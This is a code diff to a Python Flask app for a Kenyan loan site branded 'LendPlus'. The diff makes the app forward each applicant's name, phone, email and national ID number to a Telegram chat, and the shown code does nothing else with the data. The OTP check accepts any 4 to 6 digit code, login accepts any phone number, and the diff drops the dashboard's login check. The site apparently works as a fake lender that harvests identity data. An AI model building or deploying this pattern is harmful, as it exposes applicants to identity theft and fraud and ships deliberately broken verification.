@@ -1,10 +1,9 @@
-# app.py
+# app.py - Full version without config.py
 from flask import Flask, render_template, request, session, redirect, url_for
 import os
 import logging
 from datetime import datetime
-from config import Config
-from telegram_bot import telegram_bot
+import requests
 
 # Configure logging
 logging.basicConfig(level=logging.INFO)
@@ -12,14 +11,89 @@ logger = logging.getLogger(__name__)
 
 # Initialize Flask app
 app = Flask(__name__)
-app.config.from_object(Config)
+app.secret_key = os.environ.get('SECRET_KEY') or os.urandom(24)
 
-# Loan products from config
-LOAN_PRODUCTS = Config.LOAN_PRODUCTS
+# ==================== CONFIGURATION ====================
+TELEGRAM_TOKEN = os.environ.get('TELEGRAM_TOKEN')
+TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID')
+TELEGRAM_ENABLED = bool(TELEGRAM_TOKEN and TELEGRAM_CHAT_ID)
 
-# Helper functions
+APP_NAME = "LendPlus"
+COMPANY_NAME = "Aventus Technology Limited"
+SUPPORT_PHONE = "+254 709 029 000"
+SUPPORT_EMAIL = "customer@lendplus.ke"
+MIN_LOAN = 1000
+MAX_LOAN = 50000
+
+LOAN_PRODUCTS = {
+    'small': {'min': 1000, 'max': 10000, 'interest': 5, 'months': 1},
+    'medium': {'min': 10001, 'max': 30000, 'interest': 8, 'months': 3},
+    'large': {'min': 30001, 'max': 50000, 'interest': 12, 'months': 6}
+}
+# ==================== END CONFIG ====================
+
+def send_telegram_message(message):
+    """Send message to Telegram"""
+    if not TELEGRAM_ENABLED:
+        logger.warning("Telegram not configured - message not sent")
+        return None
+    
+    try:
+        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
+        payload = {
+            'chat_id': TELEGRAM_CHAT_ID,
+            'text': message,
+            'parse_mode': 'HTML'
+        }
+        response = requests.post(url, json=payload, timeout=10)
+        return response.json()
+    except Exception as e:
+        logger.error(f"Telegram error: {e}")
+        return None
+
+def format_application_message(data):
+    """Format application for Telegram"""
+    amount = data.get('loan_amount', 0)
+    if amount <= 10000:
+        rate, months = 5, 1
+    elif amount <= 30000:
+        rate, months = 8, 3
+    else:
+        rate, months = 12, 6
+    
+    interest = amount * (rate / 100)
+    total = amount + interest
+    
+    return f"""
+📋 <b>NEW LOAN APPLICATION</b>
+━━━━━━━━━━━━━━━━━━━━━
+
+👤 <b>Personal Information</b>
+• Full Name: {data.get('first_name', 'N/A')} {data.get('last_name', 'N/A')}
+• Phone: +254 {data.get('phone', 'N/A')}
+• Email: {data.get('email', 'N/A')}
+• ID Number: {data.get('national_id', 'N/A')}
+• Gender: {data.get('gender', 'N/A')}
+
+💰 <b>Loan Details</b>
+• Amount: KES {amount:,.2f}
+• Interest Rate: {rate}%
+• Interest Amount: KES {interest:,.2f}
+• Total Repayment: KES {total:,.2f}
+• Term: {months} month(s)
+
+🕐 <b>Application Time</b>
+• Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+• Application ID: {data.get('application_id', 'N/A')}
+
+━━━━━━━━━━━━━━━━━━━━━
+<b>Status: ⏳ Pending Review</b>
+
+📱 Support: {SUPPORT_PHONE}
+"""
+
 def calculate_loan_details(amount):
-    """Calculate interest and repayment details"""
+    """Calculate loan interest and repayment"""
     if amount <= 10000:
         product = LOAN_PRODUCTS['small']
     elif amount <= 30000:
@@ -42,66 +116,53 @@ def generate_application_id():
     """Generate unique application ID"""
     return f"LN{datetime.now().strftime('%Y%m%d%H%M%S')}"
 
-# Routes
+# ==================== ROUTES ====================
+
 @app.route('/')
 def index():
-    """Homepage - Landing page"""
     return render_template('index.html', 
-                         app_name=Config.APP_NAME,
-                         support_phone=Config.SUPPORT_PHONE)
+                         app_name=APP_NAME,
+                         support_phone=SUPPORT_PHONE)
 
 @app.route('/apply', methods=['GET', 'POST'])
 def apply():
-    """Step 1: Phone number entry"""
     if request.method == 'POST':
         phone = request.form.get('phone', '').strip()
         if phone and len(phone) >= 7:
             session['phone'] = phone
-            # In production, send OTP via SMS
-            # For demo, redirect to OTP verification
             return redirect(url_for('verify_otp'))
         else:
-            error = "Please enter a valid phone number"
-            return render_template('apply.html', error=error)
-    
+            return render_template('apply.html', error="Please enter a valid phone number")
     return render_template('apply.html')
 
 @app.route('/verify-otp', methods=['GET', 'POST'])
 def verify_otp():
-    """Step 2: OTP verification"""
     if 'phone' not in session:
         return redirect(url_for('apply'))
     
     if request.method == 'POST':
         otp = request.form.get('otp', '').strip()
-        # Demo: accept any 4-6 digit code
         if otp and len(otp) >= 4 and otp.isdigit():
             session['verified'] = True
             return redirect(url_for('personal_info'))
         else:
-            error = "Please enter a valid verification code"
             return render_template('verify_otp.html', 
                                  phone=session.get('phone'),
-                                 error=error)
-    
-    return render_template('verify_otp.html', 
-                         phone=session.get('phone'))
+                                 error="Please enter a valid verification code")
+    return render_template('verify_otp.html', phone=session.get('phone'))
 
 @app.route('/personal-info', methods=['GET', 'POST'])
 def personal_info():
-    """Step 3: Personal information"""
     if not session.get('verified'):
         return redirect(url_for('apply'))
     
     if request.method == 'POST':
-        # Validate required fields
         required = ['first_name', 'last_name', 'dob', 'national_id', 'email', 'gender']
         for field in required:
             if not request.form.get(field, '').strip():
-                error = f"Please fill in all required fields"
-                return render_template('personal_info.html', error=error)
+                return render_template('personal_info.html', 
+                                     error="Please fill in all required fields")
         
-        # Save personal info
         session['first_name'] = request.form.get('first_name').strip()
         session['last_name'] = request.form.get('last_name').strip()
         session['middle_name'] = request.form.get('middle_name', '').strip()
@@ -117,24 +178,19 @@ def personal_info():
 
 @app.route('/loan-amount', methods=['GET', 'POST'])
 def loan_amount():
-    """Step 4: Loan amount selection"""
     if not session.get('verified'):
         return redirect(url_for('apply'))
     
     if request.method == 'POST':
         try:
             amount = float(request.form.get('loan_amount', 0))
-            if amount < Config.MIN_LOAN or amount > Config.MAX_LOAN:
-                error = f"Loan amount must be between KES {Config.MIN_LOAN:,.0f} and KES {Config.MAX_LOAN:,.0f}"
-                return render_template('loan_amount.html', error=error)
+            if amount < MIN_LOAN or amount > MAX_LOAN:
+                return render_template('loan_amount.html', 
+                                     error=f"Amount must be between KES {MIN_LOAN:,.0f} and KES {MAX_LOAN:,.0f}")
             
-            # Calculate loan details
             details = calculate_loan_details(amount)
-            
-            # Generate application ID
             application_id = generate_application_id()
             
-            # Prepare application data
             application_data = {
                 'first_name': session.get('first_name', ''),
                 'last_name': session.get('last_name', ''),
@@ -152,35 +208,28 @@ def loan_amount():
             }
             
             # Send to Telegram
-            if Config.TELEGRAM_ENABLED:
+            if TELEGRAM_ENABLED:
                 try:
-                    telegram_bot.send_application(application_data)
-                    telegram_bot.send_quick_notification(
+                    message = format_application_message(application_data)
+                    send_telegram_message(message)
+                    send_telegram_message(
                         f"🔔 New application from {application_data['first_name']} "
                         f"{application_data['last_name']} for KES {amount:,.2f}"
                     )
                     logger.info(f"Application {application_id} sent to Telegram")
                 except Exception as e:
                     logger.error(f"Failed to send to Telegram: {e}")
-            else:
-                logger.warning("Telegram not configured - application not sent")
             
-            # Store in session
             session['application_data'] = application_data
-            
             return redirect(url_for('confirmation'))
             
         except ValueError:
-            error = "Please enter a valid amount"
-            return render_template('loan_amount.html', error=error)
+            return render_template('loan_amount.html', error="Please enter a valid amount")
     
-    return render_template('loan_amount.html', 
-                         min_loan=Config.MIN_LOAN,
-                         max_loan=Config.MAX_LOAN)
+    return render_template('loan_amount.html', min_loan=MIN_LOAN, max_loan=MAX_LOAN)
 
 @app.route('/confirmation')
 def confirmation():
-    """Step 5: Application confirmation"""
     if not session.get('verified'):
         return redirect(url_for('apply'))
     
@@ -196,37 +245,27 @@ def confirmation():
                          total=data.get('total', 0),
                          months=data.get('months', 0),
                          application_id=data.get('application_id', ''),
-                         support_phone=Config.SUPPORT_PHONE)
+                         support_phone=SUPPORT_PHONE)
 
 @app.route('/dashboard')
 def dashboard():
-    """User dashboard"""
-    if not session.get('logged_in'):
-        return redirect(url_for('login'))
-    
-    return render_template('dashboard.html',
-                         phone=session.get('user_phone', ''),
-                         app_name=Config.APP_NAME)
+    return render_template('dashboard.html', phone=session.get('user_phone', ''))
 
 @app.route('/login', methods=['GET', 'POST'])
 def login():
-    """Login page"""
     if request.method == 'POST':
         phone = request.form.get('phone', '').strip()
         if phone:
             session['logged_in'] = True
             session['user_phone'] = phone
             return redirect(url_for('dashboard'))
-    
     return render_template('login.html')
 
 @app.route('/logout')
 def logout():
-    """Logout user"""
     session.clear()
     return redirect(url_for('index'))
 
-# Static pages
 @app.route('/how-to-borrow')
 def how_to_borrow():
     return render_template('how_to_borrow.html')
@@ -243,15 +282,6 @@ def privacy():
 def terms():
     return render_template('terms.html')
 
-# Error handlers
-@app.errorhandler(404)
-def page_not_found(e):
-    return render_template('404.html'), 404
-
-@app.errorhandler(500)
-def internal_server_error(e):
-    return render_template('500.html'), 500
-
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
-    app.run(debug=Config.DEBUG, host='0.0.0.0', port=port)
+    app.run(debug=False, host='0.0.0.0', port=port)
